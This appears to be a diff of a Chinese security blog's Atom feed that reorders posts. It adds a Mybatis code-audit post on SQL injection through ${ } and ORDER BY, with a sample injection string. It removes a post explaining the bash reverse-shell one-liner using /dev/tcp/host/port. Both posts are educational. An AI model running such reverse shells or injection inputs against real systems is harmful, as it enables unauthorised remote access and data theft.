@@ -170,33 +170,6 @@
   </entry>
   
   <entry>
-    <title>接口快速测试小技巧(Python)</title>
-    <link href="http://www.vkxss.top/2019/10/11/%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)/"/>
-    <id>http://www.vkxss.top/2019/10/11/接口快速测试小技巧(Python)/</id>
-    <published>2019-10-11T07:30:08.000Z</published>
-    <updated>2019-10-16T02:30:11.452Z</updated>
-    
-    <content type="html"><![CDATA[<h2><span id="接口快速测试小技巧python">接口快速测试小技巧(Python)</span></h2><ul><li><p><font face="微软雅黑">终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺</font></p></li><li><p><font face="微软雅黑">网站：<a href="https://curl.trillworks.com" target="_blank" rel="noopener">https://curl.trillworks.com</a></font></p><p>  <a href="https://imgchr.com/i/KieFSA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieFSA.png" alt="KieFSA.png"></a></p><p>  <a href="https://imgchr.com/i/KieEOP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieEOP.png" alt="KieEOP.png"></a></p></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2&gt;&lt;span id=&quot;接口快速测试小技巧python&quot;&gt;接口快速测试小技巧(Python)&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，
-      
-    
-    </summary>
-    
-    
-      <category term="python" scheme="http://www.vkxss.top/categories/python/"/>
-    
-    
-      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SVG-XSS</title>
     <link href="http://www.vkxss.top/2019/10/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS/"/>
     <id>http://www.vkxss.top/2019/10/11/渗透测试-SVG-XSS/</id>
@@ -222,6 +195,33 @@
     
     
       <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>接口快速测试小技巧(Python)</title>
+    <link href="http://www.vkxss.top/2019/10/11/%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)/"/>
+    <id>http://www.vkxss.top/2019/10/11/接口快速测试小技巧(Python)/</id>
+    <published>2019-10-11T07:30:08.000Z</published>
+    <updated>2019-10-16T02:30:11.452Z</updated>
+    
+    <content type="html"><![CDATA[<h2><span id="接口快速测试小技巧python">接口快速测试小技巧(Python)</span></h2><ul><li><p><font face="微软雅黑">终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺</font></p></li><li><p><font face="微软雅黑">网站：<a href="https://curl.trillworks.com" target="_blank" rel="noopener">https://curl.trillworks.com</a></font></p><p>  <a href="https://imgchr.com/i/KieFSA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieFSA.png" alt="KieFSA.png"></a></p><p>  <a href="https://imgchr.com/i/KieEOP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieEOP.png" alt="KieEOP.png"></a></p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2&gt;&lt;span id=&quot;接口快速测试小技巧python&quot;&gt;接口快速测试小技巧(Python)&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，
+      
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://www.vkxss.top/categories/python/"/>
     
     
       <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
@@ -478,6 +478,37 @@
   </entry>
   
   <entry>
+    <title>Mybatis检查SQL注入</title>
+    <link href="http://www.vkxss.top/2019/08/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Mybatis%E6%A3%80%E6%9F%A5SQL%E6%B3%A8%E5%85%A5/"/>
+    <id>http://www.vkxss.top/2019/08/15/代码审计-Mybatis检查SQL注入/</id>
+    <published>2019-08-15T06:10:40.000Z</published>
+    <updated>2019-11-06T16:15:44.696Z</updated>
+    
+    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#mybatis检查sql注入总结">Mybatis检查SQL注入总结</a><ul><li><a href="#mybatis的-和-的由来">Mybatis的#{ }和${ }的由来#</a></li><li><a href="#如何排查">如何排查</a></li><li><a href="#为什么-就安全">为什么#{ }就安全</a></li><li><a href="#什么情况下用不了">什么情况下用不了#{}</a></li><li><a href="#如何解决">如何解决：</a></li><li><a href="#总结">总结：</a></li></ul></li></ul><!-- tocstop --><h2><span id="mybatis检查sql注入总结">Mybatis检查SQL注入总结</span></h2><h3><span id="mybatis的-和-的由来">Mybatis的#{ }和${ }的由来</span></h3><ul><li><p>Mybatis的Mapper.xml语句中parameterType向SQL语句传参有两种方式：#{ }和${ }。</p></li><li><p>使用#{ }来防止SQL注入，使用${ }来动态拼接参数。</p></li></ul><h3><span id="如何排查">如何排查</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 检查是否有$号</span><br><span class="line">如果你使用的是IDEA，那么通过快捷键Ctrl+Shift+R打开窗口，通过全局搜索$&#123; , 快速定位到使用$&#123; &#125;拼接SQL的语句，在去找到外部传入参数的入口，闭合sql证明即可。</span><br><span class="line"></span><br><span class="line">2. 检查是否有order by</span><br><span class="line"></span><br><span class="line">同样的在搜索是否使用order by 排序语句，如果有一步一步追踪是否有外部参数，未过滤就直接传递到order by语句里面来。</span><br></pre></td></tr></table></figure><h3><span id="为什么-就安全">为什么#{ }就安全</span></h3><ul><li><p>因为”#{}”采用JDBC预编译模式，这种写法可以很好地避免SQL注入漏洞的产生。类似如下SQL语句，</p></li><li><p>使用 ${ }效果是:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from testtable where id=&quot;1&quot; or true or id  </span><br><span class="line"># 1后面就是被攻击者恶意构造的字符</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiODTe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiODTe.jpg" alt="MiODTe.jpg"></a></p></li><li><p>而使用 #{ } 的效果是:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from testtable where id=&quot;1\&quot; or true or id\&quot;&quot;         </span><br><span class="line"># 1后面就是被攻击者恶意构造的字符</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiOdOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiOdOK.jpg" alt="MiOdOK.jpg"></a></p></li></ul><h3><span id="什么情况下用不了">什么情况下用不了#{}</span></h3><ul><li><p>order by 排序情况不行。为什么？</p></li><li><p>先复习一下order by的用法：#<br>order by就是一个排序的工具，跟我读一遍：“order by就是一个排序的工具”。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 这个1就是指第一个列索引，也可以写id （列索引）</span><br><span class="line">select * from testtable ORDER BY 1 ASC #ASC表示按升序排序,DESC表示按降序排序</span><br><span class="line"># 两个代码是一样的</span><br><span class="line">select * from testtable ORDER BY id ASC #ASC表示按升序排序,DESC表示按降序排序</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiOBwD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiOBwD.jpg" alt="MiOBwD.jpg"></a></p></li><li><p>对于order by 我们是用不了#{}的，因为用了这个就会被自动转换成字符串，自动加引号，这样语句就不生效了。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectStudentsByName&quot; resultType=&quot;Student&quot;&gt;</span><br><span class="line">    select id,name,age,score from student order by #&#123;column&#125;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;!--编译出来的结果如下：--&gt;</span><br><span class="line">select * from table order by &apos;column&apos;</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiO0eO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiO0eO.jpg" alt="MiO0eO.jpg"></a></p></li><li><p>会发现加上“” 双引号符号后，就没法正常排序了。</p></li></ul><h3><span id="如何解决">如何解决：</span></h3><ul><li>使用${}，MyBatis就不会修改或转义改字符串。但是这样又不安全，会导致潜在的SQL注入攻击。所以我们需要自己去限制，不允许用户输入一些非法字段，或者通常自行转义并检查。所以这必须过滤输入的内容。</li></ul><h3><span id="总结">总结：</span></h3><ul><li>即使是安全的sql预编译技术，也是有适用范围的，一些应用场景也是不适用的。当我们在做黑盒或者审计的时候，碰到了预编译处理不了的场景，比如说排序功能的时候就得格外注意，因为这里不仔细审查，日后就是一个祸端。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- toc --&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#mybatis检查sql注入总结&quot;&gt;Mybatis检查SQL注入总结&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#mybatis的-和-的由来&quot;&gt;Mybatis的#{ }和${ }的由来#&lt;/a&gt;&lt;/li&gt;
+&lt;li
+      
+    
+    </summary>
+    
+    
+      <category term="代码审计" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
     <title>如何绕过URL限制</title>
     <link href="http://www.vkxss.top/2019/07/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87URL%E9%99%90%E5%88%B6/"/>
     <id>http://www.vkxss.top/2019/07/20/渗透测试-如何绕过URL限制/</id>
@@ -600,37 +631,6 @@
     
     
       <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>深入理解bash反弹shell命令</title>
-    <link href="http://www.vkxss.top/2019/05/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3bash%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4/"/>
-    <id>http://www.vkxss.top/2019/05/20/深入理解bash反弹shell命令/</id>
-    <published>2019-05-20T07:30:08.000Z</published>
-    <updated>2019-10-11T10:39:53.461Z</updated>
-    
-    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-首先了解下shell">0x00 首先了解下shell</a></li><li><a href="#0x01-bash反弹shell">0x01 bash反弹shell</a><ul><li><a href="#0x001-关于-i">0x001 关于-i</a></li><li><a href="#0x002-关于">0x002 关于&gt;&amp;</a></li><li><a href="#0x003-关于01">0x003 关于0&gt;&amp;1</a></li><li><a href="#0x004-关于-devtcphostport">0x004 关于 /dev/tcp/host/port</a></li></ul></li></ul><!-- tocstop --><h2><span id="0x00-首先了解下shell">0x00 首先了解下shell</span></h2><ul><li><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。</p></li><li><p>以下是几种shell版本，bash是默认的：</p><ul><li><p>sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。<br>Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。<br>bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。<br>与 Bourne Shell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。</p></li><li><p>csh(全称 C Shell): 是一种比 Bourne Shell更适合的变种 Shell，它的语法与 C 语言很相似。<br>Tcsh: 是 Linux 提供的 C Shell 的一个扩展版本。<br>Tcsh 包括命令行编辑，可编程单词补全，拼写校正，历史命令替换，作业控制和类似 C 语言的语法，他不仅和 Bash Shell 提示符兼容，而且还提供比 Bash Shell 更多的提示符参数。<br>ksh (全称 Korn Shell): 集合了 C Shell 和 Bourne Shell 的优点并且和 Bourne Shell 完全兼容。<br>pdksh: 是 Linux 系统提供的 ksh 的扩展。<br>pdksh 支持人物控制，可以在命令行上挂起，后台执行，唤醒或终止程序。</p></li></ul></li></ul><h2><span id="0x01-bash反弹shell">0x01 bash反弹shell</span></h2><ul><li><p>对于bash反弹shell这条命令，相信很多人都很熟悉了:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>但是这里面的每个细节是否都清楚了，这可就不一定了</p></li></ul><h3><span id="0x001-关于-i">0x001 关于-i</span></h3><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# man bash | grep -E &quot;\-i&quot;</span><br><span class="line">           -i        If the -i option is present, the shell is interactive.</span><br></pre></td></tr></table></figure></li><li><p>首先 -i 是交互的模式，但是发现其实不用-i参数也是可以的，因为bash就是处理用户交互的</p><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Ha51c1a7c8224465abfbfaf3815a92f480.png" style="zoom:50%"></center><br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Ha6f37f92ee3f4a34bd421eb12fdd015aI.png" style="zoom:50%"></center></font></font></p></li></ul><h3><span id="0x002-关于gtamp">0x002 关于&gt;&amp;</span></h3><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# man bash | grep &quot;Redirecting Standard Output and Standard Error&quot; -A 30</span><br><span class="line">   Redirecting Standard Output and Standard Error</span><br><span class="line">       This  construct allows both the standard output (file descriptor 1) and</span><br><span class="line">       the standard error output (file descriptor 2) to be redirected  to  the</span><br><span class="line">       file whose name is the expansion of word.</span><br><span class="line"></span><br><span class="line">       There  are  two  formats  for  redirecting standard output and standard</span><br><span class="line">       error:</span><br><span class="line"></span><br><span class="line">              &amp;&gt;word</span><br><span class="line">       and</span><br><span class="line">              &gt;&amp;word</span><br><span class="line"></span><br><span class="line">       Of the two forms, the first is preferred.  This is semantically equiva‐</span><br><span class="line">       lent to</span><br><span class="line"></span><br><span class="line">              &gt;word 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">       When  using  the second form, word may not expand to a number or -.  If</span><br><span class="line">       it does,  other  redirection  operators  apply  (see  Duplicating  File</span><br><span class="line">       Descriptors below) for compatibility reasons.</span><br><span class="line"></span><br><span class="line">   Appending Standard Output and Standard Error</span><br><span class="line">       This  construct allows both the standard output (file descriptor 1) and</span><br><span class="line">       the standard error output (file descriptor 2) to  be  appended  to  the</span><br><span class="line">       file whose name is the expansion of word.</span><br><span class="line"></span><br><span class="line">       The format for appending standard output and standard error is:</span><br><span class="line"></span><br><span class="line">              &amp;&gt;&gt;word</span><br><span class="line"></span><br><span class="line">       This is semantically equivalent to</span><br></pre></td></tr></table></figure></li><li><p>看bash的文档，可以看到，这个是将标准输出和标准错误都重定向了跟 &gt;word 2&gt;&amp;1 的效果是一致的</p></li><li><p>当然我们用 &amp;&gt; 也是可以的</p></li></ul><h3><span id="0x003-关于0gtamp1">0x003 关于0&gt;&amp;1</span></h3><ul><li>0&gt;1是将标准输入重定向到文件名为1的文件，不存在就创建所以为了区别，那就在1前面加个&amp;来表示标准输出。</li><li>0&gt;&amp;1</li></ul><h3><span id="0x004-关于-devtcphostport">0x004 关于 /dev/tcp/host/port</span></h3><ul><li><p>我们知道linux一切皆文件，但是其实这个文件肯定是不存在的</p><ul><li><p>我们可以从man文档中看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# man bash | grep &quot;/dev/tcp&quot; -A 5</span><br><span class="line">              /dev/tcp/host/port</span><br><span class="line">                     If host is a valid hostname or Internet address, and port</span><br><span class="line">                     is  an integer port number or service name, bash attempts</span><br><span class="line">                     to open the corresponding TCP socket.</span><br><span class="line">              /dev/udp/host/port</span><br><span class="line">                     If host is a valid hostname or Internet address, and port</span><br></pre></td></tr></table></figure></li></ul></li><li><p>那么这个是在主机名、ip地址以及端口有效的情况，会打开一个TCP的套接字，连接对应主机的对应端口</p></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;!-- toc --&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#0x00-首先了解下shell&quot;&gt;0x00 首先了解下shell&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#0x01-bash反弹shell&quot;&gt;0x01 bash反弹shell&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a h
-      
-    
-    </summary>
-    
-    
-      <category term="Linux" scheme="http://www.vkxss.top/categories/Linux/"/>
-    
-    
-      <category term="反弹Shell" scheme="http://www.vkxss.top/tags/%E5%8F%8D%E5%BC%B9Shell/"/>
     
   </entry>
   
